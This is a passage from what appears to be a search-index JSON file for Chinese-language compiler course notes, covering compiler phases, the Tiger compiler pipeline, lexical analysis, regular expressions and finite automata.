\u4e00\u4e2a\u5c06\u8fd4\u56de\u503c\uff08\u51fd\u6570\u7ed3\u679c\uff09\u79fb\u52a8\u5230\u5bc4\u5b58\u5668\u7684\u6307\u4ee4 (8) \u7528\u4e8e\u6062\u590d\u88ab\u8c03\u7528\u8005\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668\u7684\u52a0\u8f7d\u6307\u4ee4 (9) \u91cd\u7f6e\u5806\u6808\u6307\u9488\u7684\u6307\u4ee4\uff08\u4e3a\u4e86\u91ca\u653e\u5e27\uff09 (10) \u8fd4\u56de\u6307\u4ee4\uff08\u8df3\u8f6c\u5230\u8fd4\u56de\u5730\u5740\uff09 (11) \u6839\u636e\u9700\u8981\u7684\u4f2a\u6307\u4ee4\uff0c\u5ba3\u544a\u51fd\u6570\u7ed3\u675f</p> <p>\u5176\u4e2d (1), (3), (9), (11) \u9700\u8981\u5177\u4f53\u7684\u6808\u5e27\u5927\u5c0f\uff0c\u800c\u6808\u5e27\u7684\u5927\u5c0f\u8981\u7b49\u5230 \u5bc4\u5b58\u5668\u5206\u914d \u540e\u786e\u8ba4\u591a\u5c11\u5c40\u90e8\u53d8\u91cf\u4e0d\u80fd\u653e\u5230\u5bc4\u5b58\u5668\u800c\u5fc5\u987b\u5b58\u653e\u5728\u6808\u5e27\u4e2d</p> Example <p></p>"}, {"location": "Course/cp/intro/", "title": "Introduction", "text": "<p> \u7ea6 908 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p>"}, {"location": "Course/cp/intro/#_1", "title": "\u7f16\u7a0b\u8bed\u8a00\u53ca\u8bbe\u8ba1", "text": "<p>A programming language is a notation for describing computations to people and to machines.</p> <p>\u4e0d\u540c\u7684\u7f16\u7a0b\u8bed\u8a00\u8303\u578b (Paradigm): </p> <ul> <li>\u8fc7\u7a0b\u5f0f (Procedural): C, Pascal, Fortran\u2026</li> <li>\u51fd\u6570\u5f0f (Functional): Lisp, Haskell, ML\u2026</li> <li>\u903b\u8f91\u5f0f (Logic): Prolog, Datalog\u2026</li> <li>\u9762\u5411\u5bf9\u8c61 (Object-Oriented): C++, Java, Python, Smalltalk\u2026</li> </ul> <p>\u7f16\u7a0b\u8bed\u8a00 = \u8bed\u6cd5 + \u8bed\u4e49</p> <ul> <li>\u8bed\u6cd5\uff1aWhat sequences of characters are valid programs? (\u901a\u5e38\u7531\u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5\u5b9a\u4e49)</li> <li>\u8bed\u4e49\uff1aWhat is the behavior of a valid program? <ul> <li>\u64cd\u4f5c\u8bed\u4e49\uff1aHow can we execute a program?</li> <li>\u516c\u7406\u8bed\u4e49\uff1aWhat can we prove about a program?</li> <li>\u6307\u79f0\u8bed\u4e49\uff1aWhat math function does a program compute?</li> </ul> </li> </ul>"}, {"location": "Course/cp/intro/#_2", "title": "\u7f16\u8bd1\u5668\u53ca\u5f62\u5f0f", "text": "<p>\u7f16\u8bd1\u5668\uff1aTranslate from the syntax of one language to another but preserve the semantics. </p> <ul> <li>\u7f16\u8bd1\u5668\u662f\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u8bfb\u5165\u6e90\u7a0b\u5e8f\u5e76\u5c06\u5176\u7ffb\u8bd1\u6210\u8bed\u4e49\u7b49\u4ef7\u7684\u76ee\u6807\u7a0b\u5e8f (\u53ef\u4ee5\u662f\u53ef\u6267\u884c\u7684\u673a\u5668\u8bed\u8a00\u7a0b\u5e8f\u4e5f\u53ef\u4ee5\u662f\u6c47\u7f16\u6216\u5176\u4ed6\u8bed\u8a00\u7a0b\u5e8f)</li> <li>\u89e3\u91ca\u5668\uff1a\u5728\u4e00\u79cd\u8bed\u8a00\u7684\u673a\u5668\u4e0a\uff0c\u76f4\u63a5\u6267\u884c\u7528\u53e6\u4e00\u79cd\u8bed\u8a00\u5199\u7684\u7a0b\u5e8f\u7684\u8fc7\u7a0b\uff0c\u79f0\u4e3a\u89e3\u91ca</li> </ul> <p>\u7f16\u8bd1\u5668\u7684\u5176\u4ed6\u5f62\u5f0f</p> <ul> <li>\u4ea4\u53c9\u7f16\u8bd1\u5668 (Cross compiler): \u4ece\u4e00\u79cd\u5e73\u53f0\u4e0a\u7684\u8bed\u8a00\u7ffb\u8bd1\u5230\u53e6\u4e00\u79cd\u5e73\u53f0\u4e0a\u7684\u8bed\u8a00</li> <li>\u589e\u91cf\u7f16\u8bd1\u5668 (Incremental compiler): \u589e\u91cf\u5730\u7f16\u8bd1\u6e90\u7a0b\u5e8f(\u53ea\u7f16\u8bd1\u4fee\u6539\u7684\u90e8\u5206)</li> <li>\u5373\u65f6\u7f16\u8bd1\u5668 (Just-in-time compiler): \u5728\u8fd0\u884c\u65f6\u5bf9IR\u4e2d\u6bcf\u4e2a\u88ab\u8c03\u7528\u7684\u65b9\u6cd5\u8fdb\u884c\u7f16\u8bd1\uff0c\u5f97\u5230\u76ee\u6807\u673a\u5668\u7684\u672c\u5730\u4ee3\u7801\uff0c\u5982 Java VM \u4e2d\u7684\u5373\u65f6\u7f16\u8bd1\u5668</li> <li>\u9884\u5148\u7f16\u8bd1\u5668 (Ahead-of-time compiler): \u5728\u7a0b\u5e8f\u6267\u884c\u524d\u5c06IR\u7ffb\u8bd1\u6210\u672c\u5730\u7801\uff0c\u5982ART\u4e2d\u7684AOT</li> </ul> <p>JIT \u548c AOT \u90fd\u662f\u9762\u5411\u89e3\u91ca\u578b\u8bed\u8a00\u7684</p>"}, {"location": "Course/cp/intro/#_3", "title": "\u7f16\u8bd1\u5668\u7684\u9636\u6bb5", "text": "<p>\u4e00\u4e2a\u7f16\u8bd1\u8fc7\u7a0b\u53ef\u4ee5\u6982\u62ec\u4e3a\u7a0b\u5e8f\u5458\u8f93\u5165\u7f16\u5199\u7684\u6e90\u7a0b\u5e8f\uff0c\u7ecf\u8fc7\u524d\u7aef\u3001\u4e2d\u7aef\u548c\u540e\u7aef\u751f\u6210\u673a\u5668\u786c\u4ef6\u4e0a\u8fd0\u884c\u7684\u76ee\u6807\u4ee3\u7801\uff1a</p> <ul> <li>\u524d\u7aef\uff1a\u8bcd\u6cd5\u5206\u6790\u3001\u8bed\u6cd5\u5206\u6790\u3001\u8bed\u4e49\u5206\u6790</li> <li>\u4e2d\u7aef\uff1a\u4e2d\u95f4\u4ee3\u7801\u751f\u6210\u3001\u673a\u5668\u65e0\u5173\u4ee3\u7801\u4f18\u5316</li> <li>\u540e\u7aef\uff1a\u6307\u4ee4\u9009\u62e9\u3001\u5bc4\u5b58\u5668\u5206\u914d\u3001\u6307\u4ee4\u8c03\u5ea6\u3001\u673a\u5668\u76f8\u5173\u4ee3\u7801\u4f18\u5316</li> </ul> <ul> <li>Symbol Table \u7b26\u53f7\u8868<ul> <li>\u8bb0\u5f55\u7a0b\u5e8f\u4e2d\u53d8\u91cf\u3001\u51fd\u6570\u7b49\u5bf9\u8c61\u7684\u5404\u79cd\u5c5e\u6027</li> <li>\u7b26\u53f7\u8868\u53ef\u7531\u7f16\u8bd1\u5668\u7684\u5404\u4e2a\u6b65\u9aa4\u4f7f\u7528</li> </ul> </li> <li>Error Handler \u9519\u8bef\u5904\u7406<ul> <li>\u8bed\u6cd5\u9519\u8bef: \u5982\u7b97\u672f\u8868\u8fbe\u5f0f\u7684\u62ec\u53f7\u4e0d\u914d\u5bf9</li> <li>\u8bed\u4e49\u9519\u8bef: \u5982\u7b97\u7b26\u4f5c\u7528\u4e8e\u4e0d\u76f8\u5bb9\u7684\u8fd0\u7b97\u5bf9\u8c61</li> </ul> </li> </ul> <ul> <li>\u524d\u7aef\uff1a<ul> <li>\u8bcd\u6cd5\u5206\u6790 | Lexing/Scanning/Lexical Analysis<ul> <li>\u5c06\u7a0b\u5e8f\u5b57\u7b26\u6d41\u5206\u89e3\u4e3a\u8bb0\u53f7 (Token)\u5e8f\u5217</li> <li>e.g. </li> </ul> </li> <li>\u8bed\u6cd5\u5206\u6790 | Parsing/Syntax Analysis<ul> <li>\u5c06\u8bb0\u53f7\u5e8f\u5217\u89e3\u6790\u4e3a\u8bed\u6cd5\u7ed3\u6784</li> <li>e.g. </li> </ul> </li> <li>\u8bed\u4e49\u5206\u6790(Semantic Analysis)<ul> <li>\u6536\u96c6\u6807\u8bc6\u7b26\u7684\u7c7b\u578b\u7b49\u5c5e\u6027\u4fe1\u606f</li> <li>e.g. </li> </ul> </li> </ul> </li> <li>\u4e2d\u7aef\uff1a<ul> <li>\u4e2d\u95f4\u4ee3\u7801\u751f\u6210 | Intermediate Code Generation<ul> <li>\u4e2d\u95f4\u4ee3\u7801/\u4e2d\u95f4\u8868\u793a: \u6e90\u8bed\u8a00\u4e0e\u76ee\u6807\u8bed\u8a00\u4e4b\u95f4\u7684\u6865\u6881</li> <li>e.g. </li> </ul> </li> <li>(\u57fa\u4e8e\u4e2d\u95f4\u8868\u793a\u7684)\u4f18\u5316 (\u4e0e\u673a\u5668\u65e0\u5173\u7684\u4ee3\u7801\u4f18\u5316)<ul> <li>\u57fa\u4e8e\u4e2d\u95f4\u8868\u793a\u8fdb\u884c\u5206\u6790\u4e0e\u53d8\u6362\uff0c\u964d\u4f4e\u6267\u884c\u65f6\u95f4\uff0c\u51cf\u5c11\u8d44\u6e90\u6d88\u8017\u7b49</li> <li>e.g. </li> </ul> </li> </ul> </li> <li>\u540e\u7aef\uff1a<ul> <li>\u76ee\u6807\u4ee3\u7801\u751f\u6210<ul> <li>\u628a\u4e2d\u95f4\u8868\u793a\u5f62\u5f0f\u7ffb\u8bd1\u5230\u76ee\u6807\u8bed\u8a00 (\u6307\u4ee4\u9009\u62e9\u3001\u5bc4\u5b58\u5668\u5206\u914d\u3001\u6307\u4ee4\u8c03\u5ea6)</li> <li>e.g. </li> </ul> </li> </ul> </li> </ul>"}, {"location": "Course/cp/intro/#tiger", "title": "\u6848\u4f8b\uff1aTiger \u7f16\u7a0b\u5668", "text": "<p>Tiger \u7f16\u8bd1\u5668\u7684\u6d41\u7a0b\u5982\u4e0b\uff1a</p> <p></p> <ul> <li>AST(\u62bd\u8c61\u8bed\u6cd5\u6811): \u8bed\u6cd5\u5206\u6790 + \u201cParsing Actions\u201d\u751f\u6210</li> <li>IR Tree: \u8bed\u4e49\u5206\u6790\u540e\u6309\u4e00\u5b9a\u89c4\u5219\u751f\u6210(\u6811\u578b\u4e2d\u95f4\u8868\u793a)</li> <li>Tiger \u751f\u6210 IR Tree \u540e\u4f1a\u518d\u5bf9\u5176\u505a\u53d8\u6362\u5f97\u5230 Canonicalized IR Tree (\u65b9\u4fbf\u751f\u6210\u6c47\u7f16)</li> <li>\u968f\u540e\u7ecf\u8fc7 Assem \u6307\u4ee4\u9009\u62e9\u5668\u751f\u6210\u62bd\u8c61\u6c47\u7f16\u4ee3\u7801 (\u4e00\u79cd\u7279\u6b8a\u7684\u6c47\u7f16\u4ee3\u7801\uff0c\u5982\u5047\u8bbe\u4e86\u65e0\u9650\u6570\u91cf\u7684\u865a\u62df\u5bc4\u5b58\u5668)</li> <li>CFG(Control Flow Graph) \u63a7\u5236\u6d41\u56fe: \u65b9\u4fbf\u8fdb\u884c\u6570\u636e\u6d41\u5206\u6790\u2013 \u5982\u6d3b\u8dc3\u53d8\u91cf\u5206\u6790(Liveness Analysis)</li> <li>Interference Graph: \u4ece\u6d3b\u8dc3\u53d8\u91cf\u5206\u6790\u7684\u7ed3\u679c\u6784\u9020\uff0c\u7528\u4e8e\u6307\u5bfc\u5bc4\u5b58\u5668\u5206\u914d</li> </ul>"}, {"location": "Course/cp/lexical/", "title": "\u8bcd\u6cd5\u5206\u6790 | Lexical Analysis", "text": "<p> \u7ea6 3079 \u4e2a\u5b57  4 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 10 \u5206\u949f</p>"}, {"location": "Course/cp/lexical/#_1", "title": "\u8bcd\u6cd5\u5206\u6790\u6982\u8ff0", "text": "<ul> <li>\u7a0b\u5e8f\u4ee5\u5b57\u7b26\u4e32\u7684\u5f62\u5f0f\u4f20\u9012\u7ed9\u7f16\u8bd1\u5668</li> </ul> <pre><code>if (i == j)\n    z = 0;\nelse\n    z = 1;\n</code></pre> <p>-&gt;</p> <pre><code>\\tif(i == j)\\n\\t\\tz = 0;\\n\\telse\\n\\t\\tz = 1;\n</code></pre> <p>\u8bcd\u6cd5\u5206\u6790\uff1a\u5c06\u8f93\u5165\u5b57\u7b26\u4e32\u8bc6\u522b\u4e3a\u6709\u610f\u4e49\u7684\u5b50\u4e32</p> <ul> <li>Partition input string into substrings (lexeme<sup>1</sup>)</li> <li>Classify them according to their role (tokens)</li> </ul> Example <p></p> <p>Tokens \u662f\u6307\u7a0b\u5e8f\u8bbe\u8ba1\u8bed\u8a00\u4e2d\u5177\u6709\u72ec\u7acb\u542b\u4e49\u7684\u6700\u5c0f\u8bcd\u6cd5\u5355\u4f4d\uff0c\u5305\u542b\u5355\u8bcd\u3001\u6807\u70b9\u7b26\u53f7\u3001\u64cd\u4f5c\u7b26\u3001\u5206\u9694\u7b26\u7b49\u3002\u5982\u4e00\u4e9b\u5178\u578b\u6d4b\u8bd5\u8bed\u8a00\u7684\u4e00\u4e9b token \u7c7b\u578b\u4e3a\uff1a</p> Type EXamples ID foo n14 last Num 73 0 00 012 REAL 6.1 .5 10. 1e-1 IF if COMMA , NOTEQ != LPAREN ( RPAREN ) <p>\u53e6\u5916\u4e00\u4e9b tokens \u5982 IF, VOID, RETURN \u79f0\u4f5c reserved words\uff0c\u5728\u5927\u591a\u6570\u8bed\u8a00\u4e2d\u4e0d\u80fd\u6210\u4e3a identifiers\uff08\u5373\u4e0a\u56fe\u4e2d\u7684 ID\uff09</p> <p>Examples of nontokens are</p> <pre><code>comment                     /* try again */\npreprocessor directive      #include &lt;stdio.h&gt;\npreprocessor directive      #define NUMS 5, 6\nmacro                       NUMS\nblanks, tabs and newlines\n</code></pre> <p>\u5728\u4e00\u4e9b\u9700\u8981\u5b8f\u9884\u5904\u7406\u5668 (macro preprocessor) \u7684\u8bed\u8a00\u4e2d\uff0c\u7531\u9884\u5904\u7406\u5668\u5904\u7406\u6e90\u7a0b\u5e8f\u7684\u5b57\u7b26\u6d41\u751f\u6210\u53e6\u5916\u7684\u5b57\u7b26\u6d41\uff0c\u7136\u540e\u7531\u9001\u5165\u8bcd\u6cd5\u5206\u6790\u5668\uff08Lexical Analyzer\uff09\u3002\u8fd9\u79cd\u5b8f\u9884\u5904\u7406\u8fc7\u7a0b\u4e5f\u53ef\u4ee5\u4e0e\u8bcd\u6cd5\u5206\u6790\u5668\u96c6\u6210\u5728\u4e00\u8d77\u3002</p> <p>\u8f85\u52a9\u4efb\u52a1\uff1a\u8fc7\u6ee4\u6ce8\u91ca\u3001\u7a7a\u683c, etc.</p>"}, {"location": "Course/cp/lexical/#_2", "title": "\u6b63\u5219\u8868\u8fbe\u5f0f", "text": "<p>\u5f62\u5f0f\u5316\u5730\u63cf\u8ff0\u8bcd\u6cd5</p> <ul> <li>\u5b57\u6bcd\u8868 (alphabet): \u7b26\u53f7\u7684\u6709\u9650\u96c6\u5408<ul> <li>\u5b57\u6bcd\uff0c\u6570\u5b57\uff0c\u6807\u70b9\u7b26\u53f7\u2026</li> </ul> </li> <li>\u4e32 (string, word): \u5b57\u6bcd\u8868\u4e2d\u7b26\u53f7\u7684\u6709\u7a77\u5e8f\u5217<ul> <li>\u4e32 s \u7684\u957f\u5ea6\uff0c\u5e38\u8bb0\u4f5c |s|\uff0c\u8868\u793a\u4e32\u4e2d\u7b26\u53f7\u7684\u4e2a\u6570</li> <li>\u7a7a\u4e32 (empty string) \u7528 \\(\\epsilon\\) \u8868\u793a</li> </ul> </li> </ul> \u533a\u522b <ul> <li>\\(\\epsilon\\) \u8868\u793a\u7a7a\u4e32</li> <li>\\(\\emptyset\\) \u8868\u793a\u7a7a\u96c6</li> <li>\\(\\{\\epsilon\\}\\) \u662f\u975e\u7a7a\u96c6\u5408</li> </ul> <p>\u4e32\u4e0a\u7684\u8fd0\u7b97</p> <ul> <li>\u8fde\u63a5 (concatenation): y \u9644\u52a0\u5230 x \u540e\u5f62\u6210\u7684\u4e32\u8bb0\u4f5c xy<ul> <li>\u4f8b\u5982\uff0c\u5982\u679c x=dog \u4e14 y=house\uff0c\u90a3\u4e48 xy=doghouse</li> </ul> </li> <li>\u5e42\u8fd0\u7b97 (\u4e32 s \u7684 n \u6b21\u5e42\uff1a\u5c06 n \u4e2a s \u8fde\u63a5\u8d77\u6765)</li> </ul> \\[\\begin{cases}     &amp;s^0 = \\epsilon \\\\     &amp;s^n = s^{n-1}s, \\text{ for } n \\ge 1 \\end{cases}\\]"}, {"location": "Course/cp/lexical/#_3", "title": "\u5f62\u5f0f\u8bed\u8a00", "text": "<p>\u8bed\u8a00: \u5b57\u6bcd\u8868 \\(\\sum\\) \u4e0a\u7684\u4e32\u7684\u96c6\u5408</p> <ul> <li>e.g. \\(\\{\\epsilon, 0, 00, 000, \\dots \\}\\), \\(\\{\\epsilon\\}\\), \\(\\emptyset\\)</li> <li>\u53e5\u5b50\uff1a\u5c5e\u4e8e\u8bed\u8a00\u7684\u4e32</li> </ul> <p>\u8bed\u8a00\u7684\u8fd0\u7b97\uff1a\uff08\u4f18\u5148\u7ea7\uff1a\u5e42 &gt; \u8fde\u63a5 &gt; \u5e76\uff09</p> <p></p> <p>\u5728\u4e66\u5199\u6b63\u5219\u8868\u8fbe\u5f0f\u65f6\uff0c\u6211\u4eec\u6709\u65f6\u7701\u7565 <code>\u00b7</code> \u548c \\(\\epsilon\\) \uff0c\u5e76\u89c4\u5b9a <code>*</code> \u4f18\u5148\u7ea7\u9ad8\u4e8e <code>\u00b7</code> \u9ad8\u4e8e <code>|</code> \u3002\u8fd8\u6709\u4e00\u4e9b\u7f29\u5199\u5f62\u5f0f\uff1a</p> <ul> <li>\\([abcd]\\) \u8868\u793a \\(\\{a | b | c | d\\}\\)</li> <li>\\([b-gM-Qkr]\\) \u8868\u793a \\([bcdefgMNOPQkr]\\)</li> <li>\\(T?\\) \u8868\u793a \\(T | \\epsilon\\), \u5373 \\(T\\) \u6216\u7a7a\u4e32</li> </ul> <p>\u8fd8\u6709\u4e00\u4e9b\u5176\u4ed6\u7684\u7b26\u53f7\uff1a</p> <ul> <li><code>.</code> \uff1a \u9664\u6362\u884c\u7b26\u5916\u7684\u4efb\u610f\u5355\u4e2a\u5b57\u7b26</li> <li><code>\"a.+*\"</code> : \u5f15\u53f7\u4e2d\u7684\u5b57\u7b26\u4e32\u5339\u914d\u81ea\u8eab</li> </ul> Example <p>\u7ed9\u5b9a\u8bed\u8a00 \\(L = \\{a, b\\}\\), \\(M = \\{cc, dd\\}\\)</p> \u8fd0\u7b97 \u63cf\u8ff0 \u7ed3\u679c \u5e76 \\(L \\cup M = \\{s \\vert s \\in L \u6216 s \\in M \\}\\) \\(L \\cup M = \\{a, b, cc, dd\\}\\) \u8fde\u63a5 \\(LM = \\{st \\vert s \\in L \u4e14 t \\in M\\}\\) \\(LM = \\{acc, add, bcc, bdd\\}\\) \u5e42 \\(L^0 = \\{\\epsilon\\}\\), \\(L^i = L^{i-1}L\\) \\(L^2 = \\{aa, ab, ba, bb\\}\\) \u95ed\u5305 \\(L^* = \\bigcup_{i=0}^{\\infty}L^i\\) \\(L^* = \\{\\epsilon, a, b, aa, ab, ba, bb, \\dots\\}\\) \u6b63\u95ed\u5305 \\(L^+ = \\bigcup_{i=1}^{\\infty}L^i\\) \\(L^+ = \\{a, b, aa, ab, ba, bb, \\dots\\}\\)"}, {"location": "Course/cp/lexical/#re", "title": "\u6b63\u5219\u8868\u8fbe\u5f0f | RE", "text": "<p>\u6b63\u5219\u8868\u8fbe\u5f0f (regular expression) \\(r\\) \u5b9a\u4e49\u6b63\u5219\u8bed\u8a00\uff0c\u8bb0\u4e3a \\(L(r)\\)</p> <ol> <li>\\(\\epsilon\\) \u662f\u4e00\u4e2a RE, \\(L(\\epsilon) = \\{\\epsilon\\}\\)</li> <li>\u5982\u679c \\(a \\in \\sum\\)\uff0c\u90a3\u4e48 \\(a\\) \u662f\u4e00\u4e2a RE, \\(L(a) = \\{a\\}\\)</li> <li>\u5047\u8bbe \\(r\\) \u548c \\(s\\) \u90fd\u662f RE, \u5206\u522b\u8868\u793a\u8bed\u8a00 \\(L(r)\\) \u548c \\(L(s)\\)<ul> <li>\\(r | s\\) \u662f RE, \\(L(r|s) = L(r) \\cup L(s)\\)</li> <li>\\(rs\\) \u662f RE, \\(L(rs) = L(r)L(s)\\)</li> <li>\\(r^*\\) \u662f RE, \\(L(r^*) = (L(r))^*\\)</li> <li>\\((r)\\) \u662f RE, \\(L((r)) = L(r)\\)</li> <li>\u4f18\u5148\u7ea7\uff1a\u95ed\u5305* &gt; \u8fde\u63a5 &gt; \u9009\u62e9|</li> </ul> </li> </ol> <p>Pumping Lemma</p> <ul> <li>\u7528\u4e8e\u8bc1\u660e\u67d0\u4e2a\u8bed\u8a00\u4e0d\u662f\u6b63\u5219\u8bed\u8a00, \u5982 \\(L = \\{0^n1^n | n \\geq 0\\}\\) \u4e0d\u662f\u6b63\u5219\u8bed\u8a00</li> <li>\u5177\u4f53\u53c2\u89c1  Pumping Lemma</li> </ul> \u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u4e00\u4e9b\u5b9a\u5f8b \u5b9a\u5f8b \u63cf\u8ff0 \\(r \\vert s = s \\vert r\\) \u9009\u62e9\u8fd0\u7b97\u7684\u4ea4\u6362\u5f8b \\((r \\vert s) \\vert t = r \\vert (s \\vert t)\\) \u9009\u62e9\u8fd0\u7b97\u7684\u7ed3\u5408\u5f8b \\(r(st) = (rs)t\\) \u8fde\u63a5\u8fd0\u7b97\u7684\u7ed3\u5408\u5f8b \\(r(s \\vert t) = rs \\vert rt\\) \u8fde\u63a5\u8fd0\u7b97\u5bf9\u9009\u62e9\u8fd0\u7b97\u7684\u5206\u914d\u5f8b \\(\\epsilon r = r\\epsilon = r\\) \u95ed\u5305\u8fd0\u7b97\u7684\u5e7a\u5143 \\(r^* = (r \\vert \\epsilon)^*\\) \u95ed\u5305\u4e2d\u4e00\u5b9a\u542b \\(\\epsilon\\) \\(r^{**} = r^*\\) \u95ed\u5305\u8fd0\u7b97\u7684\u5e42\u7b49\u5f8b"}, {"location": "Course/cp/lexical/#_4", "title": "\u6b63\u5219\u5b9a\u4e49, \u8bcd\u6cd5\u5206\u6790", "text": "<p>\u6b63\u5219\u5b9a\u4e49 (regular definition): </p> <ul> <li>\u5bf9\u4e8e\u6bd4\u8f83\u590d\u6742\u7684\u8bed\u8a00\uff0c\u4e3a\u4e86\u6784\u9020\u7b80\u6d01\u7684\u6b63\u5219\u5f0f\uff0c\u53ef\u5148\u6784\u9020\u7b80\u5355\u7684\u6b63\u5219\u5f0f\uff0c\u518d\u5c06\u8fd9\u4e9b\u6b63\u5219\u5f0f\u7ec4\u5408\u8d77\u6765\uff0c\u5f62\u6210\u4e00\u4e2a\u4e0e\u8be5\u8bed\u8a00\u5339\u914d\u7684\u6b63\u5219\u5e8f\u5217</li> <li>\u6b63\u5219\u5b9a\u4e49\u662f\u5177\u6709\u5982\u4e0b\u5f62\u5f0f\u7684\u5b9a\u4e49\u5e8f\u5217\uff1a</li> </ul> \\[\\begin{align*}     &amp;d_1 \\rightarrow r_1 \\\\     &amp;d_2 \\rightarrow r_2 \\\\     &amp;\\dots \\\\     &amp;d_n \\rightarrow r_n \\end{align*}\\] <ol> <li>\u5404\u4e2a \\(d_i\\) \u662f\u4e0d\u540c\u7684\u6807\u8bc6\u7b26\uff0c\u79f0\u4e3a\u5b9a\u4e49\u540d</li> <li>\u6bcf\u4e2a \\(r_i\\) \u90fd\u662f \\(\\sum \\cup \\{d_1, d_2, \\dots, d_{i-1} \\}\\) \u4e0a\u7684\u6b63\u5219\u8868\u8fbe\u5f0f</li> </ol> <p>\u7ed9\u4e00\u4e9b RE \u547d\u540d\uff0c\u5e76\u5728\u4e4b\u540e\u7684 RE \u4e2d\u50cf\u4f7f\u7528\u5b57\u6bcd\u8868\u4e2d\u7684\u7b26\u53f7\u4e00\u6837\u4f7f\u7528\u8fd9\u4e9b\u540d\u5b57</p> Example <ul> <li>\u6574\u6570\u7684\u6b63\u5219\u5b9a\u4e49: <ul> <li>\\(\\text{digit} \\rightarrow 0|1|2|3|4|5|6|7|8|9\\) \u6216\u7b80\u8bb0\u4e3a \\([0-9]\\)</li> <li>\\(\\text{number} \\rightarrow \\text{digit (digit)}^*\\) \u6216 \\(\\text{digit}^+\\)</li> </ul> </li> <li>C \u8bed\u8a00\u7684\u6807\u8bc6\u7b26 (\u5b57\u6bcd\u3001\u6570\u5b57\u548c\u4e0b\u5212\u7ebf\u7ec4\u6210\u7684\u4e32) \u7684\u6b63\u5219\u5b9a\u4e49<ul> <li>\\(\\text{digit} \\rightarrow [0-9]\\)</li> <li>\\(\\text{letter}\\_ \\rightarrow [A-Za-z\\_]\\)</li> <li>\\(\\text{id} \\rightarrow \\text{letter}\\_(\\text{letter}\\_ | \\text{digit})^*\\)</li> </ul> </li> </ul> <p>\u8bcd\u6cd5\u5206\u6790\uff1a\u5b57\u7b26\u6d41\u5230 Token-lexeme \u5bf9</p> <ol> <li>Select a set of tokens<ul> <li>Number, Keyword, Identifier, \u2026</li> </ul> </li> <li>Write a R.E. for the lexemes of each token<ul> <li>Number = digit<sup>+</sup></li> <li>Keyword = \u2018if\u2019 | \u2018else\u2019 | \\(\\dots\\)</li> <li>Identifier = letter (letter | digit)<sup>*</sup></li> <li>LeftPar = \u2018(\u2018</li> <li>\\(\\dots\\)</li> </ul> </li> </ol> <p>\u6b63\u5219\u89c4\u5219\u7684\u4e8c\u4e49\u6027</p> <p>\u7ed9\u5b9a <code>if8</code>, \u5b83\u662f\u5355\u4e2a\u6807\u8bc6\u7b26\uff0c\u8fd8\u662f\u4e24\u4e2a token (<code>if</code> \u548c <code>8</code>) \u7684\u7ec4\u5408\uff1f</p> <p>\u4e3a\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u5f15\u51fa\u4e24\u79cd rule\uff1a</p> <ol> <li>\u6700\u957f\u5339\u914d Longest Match: The longest initial substring of the input that can match any regular expression is taken as the next token.</li> <li>\u89c4\u5219\u4f18\u5148 Rule Priority: <ul> <li>For a particular longest initial substring, the first regular expression that can match determines its token-type. </li> <li>This means that the order of writing down the regular-expression rules has significance.</li> </ul> </li> </ol> <p>\u56e0\u6b64\uff0c\u6309\u6700\u957f\u5339\u914d\uff0c\u8bc6\u522b\u4e3a <code>if8</code> \u3002 \u6309\u89c4\u5219\u4f18\u5148 <code>if</code> \u4f18\u5148\u4e8e <code>identifier</code>\uff0c\u6240\u4ee5 <code>if8</code> \u662f\u4e00\u4e2a <code>if</code> token \u548c\u4e00\u4e2a <code>identifier</code> token \u7684\u7ec4\u5408\u3002</p>"}, {"location": "Course/cp/lexical/#finite-automata", "title": "\u6709\u7a77\u81ea\u52a8\u673a | Finite Automata", "text": "<p>\u5224\u5b9a\u4e00\u4e2a\u4e32\u5339\u914d\u67d0\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u5e76\u5f62\u5f0f\u5316\u5730\u63cf\u8ff0\u8fd9\u4e2a\u5339\u914d\u8fc7\u7a0b</p> <p>\u6709\u7a77\u81ea\u52a8\u673a (Finite Automaton, FA) \u662f\u4e00\u4e2a\u4e94\u5143\u7ec4 \\(M = (S, \\sum, move, s_0, F)\\)</p> <ol> <li>\\(S\\) : \u6709\u7a77\u72b6\u6001\u96c6\u5408</li> <li>\\(\\sum\\) : \u8f93\u5165\u5b57\u7b26\u96c6\u5408 / \u5b57\u6bcd\u8868</li> <li>\\(move(s,a)\\) : \u8f6c\u6362\u51fd\u6570\uff0c\u8868\u793a\u4ece\u72b6\u6001 \\(s\\) \u51fa\u53d1\uff0c\u8bfb\u5165\u8f93\u5165 \\(a\\) \u65f6\u8f6c\u5316\u5230\u7684\u72b6\u6001</li> <li>\\(s_0\\) : \u521d\u59cb\u72b6\u6001\uff0c\\(s_0 \\in S\\)</li> <li>\\(F\\) : \u7ec8\u6b62\u72b6\u6001\u96c6\u5408\uff0c\\(F \\subseteq S\\)</li> </ol> <p>\u6709\u7a77\u81ea\u52a8\u673a\u7684\u8868\u793a\uff1a</p> <ol> <li>\u8f6c\u6362\u56fe (Transition Diagram)\uff1a\u7528\u56fe\u5f62\u8868\u793a\u6709\u7a77\u81ea\u52a8\u673a</li> </ol> <p></p> <ol> <li>\u8f6c\u6362\u8868 (Transition Table)\uff1a\u7528\u8868\u683c\u8868\u793a\u6709\u7a77\u81ea\u52a8\u673a</li> </ol> <p></p> <p>\u6709\u7a77\u81ea\u52a8\u673a\u63a5\u6536\u7684\u4e32</p> <p>\u7ed9\u5b9a\u8f93\u5165\u4e32 \\(x\\)\uff0c\u5982\u679c\u5b58\u5728\u4e00\u4e2a\u5bf9\u5e94\u4e8e\u4e32 \\(x\\) \u7684\u4ece \u521d\u59cb\u72b6\u6001 \u5230\u67d0\u4e2a \u7ec8\u6b62\u72b6\u6001 \u7684\u8f6c\u6362\u5e8f\u5217\uff0c\u5219\u79f0\u4e32 \\(x\\) \u88ab\u8be5 \\(FA\\) \u63a5\u6536</p> <p></p> <p>\u6709\u7a77\u81ea\u52a8\u673a\u63a5\u6536\uff08\u5b9a\u4e49\uff09\u7684\u8bed\u8a00</p> <ul> <li>\u7531\u4e00\u4e2a\u6709\u7a77\u81ea\u52a8\u673a \\(M\\) \u63a5\u6536\u7684\u6240\u6709\u4e32\u6784\u6210\u7684\u96c6\u5408\uff0c\u79f0\u4e3a\u8be5 \\(FA\\) 